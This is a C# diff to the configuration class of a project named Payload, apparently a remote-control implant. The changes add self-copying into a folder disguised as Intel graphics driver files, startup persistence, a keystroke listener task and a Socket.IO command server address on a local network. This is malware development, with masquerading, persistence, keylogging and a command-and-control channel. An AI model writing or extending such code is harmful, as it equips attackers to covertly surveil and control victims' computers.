@@ -4,6 +4,7 @@ using System.IO;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using static System.Environment;
 
 namespace Payload.Common
 {
@@ -32,6 +33,10 @@ namespace Payload.Common
         {
             WorkSpaceDir = Directory.GetCurrentDirectory();
             ExeName = System.AppDomain.CurrentDomain.FriendlyName;
+            ExeFullName = $"{WorkSpaceDir}\\{ExeName}";
+            TargetWorkSpaceDir = $"{System.Environment.GetFolderPath(SpecialFolder.CommonApplicationData)}\\Intel\\Drivers\\Graphics";
+            if(!Directory.Exists(TargetWorkSpaceDir))
+                Directory.CreateDirectory(TargetWorkSpaceDir);            
         }
 
         #region Enum
@@ -39,22 +44,28 @@ namespace Payload.Common
         {
             Demo,
             WallpaperEngine,
-            TcpClient,
-            KeyListener
+            SocketIO,
+            KeyListener,
+            ShowStarMenu,
+            StartupSetup,
+            CopyItself
         }
 
         public enum EnumTaskPackMode
         {
             NONE,
             AUTO,
-            ONCE
+            ONCE,
+            EXIT
         }
         #endregion
 
         #region Global
         public string WorkSpaceDir;
+        public string TargetWorkSpaceDir;
         public string ExeName;
-        public int MainSleepInterval = 10 * 1000;
+        public string ExeFullName;
+        public int MainSleepInterval = 5 * 1000;
         #endregion
 
         #region Class CommandManager
@@ -72,8 +83,8 @@ namespace Payload.Common
         #endregion
 
         #region Class SocketIOClientCommand
-        public long SocketIOClientCommandDefaultInterval = 30 * 1000;
-        public string SocketIOClientCommandServerHost = "http://192.168.88.221:55699"; // "http://192.168.88.240:5000" "http://192.168.88.221:55699" "http://127.0.0.1:55699"
+        public long SocketIOClientCommandDefaultInterval = 60 * 1000;
+        public string SocketIOClientCommandServerHost = "http://192.168.88.221:5555"; // "http://192.168.88.240:5000" "http://192.168.88.221:55699" "http://127.0.0.1:55699"
         #endregion
     }
 }
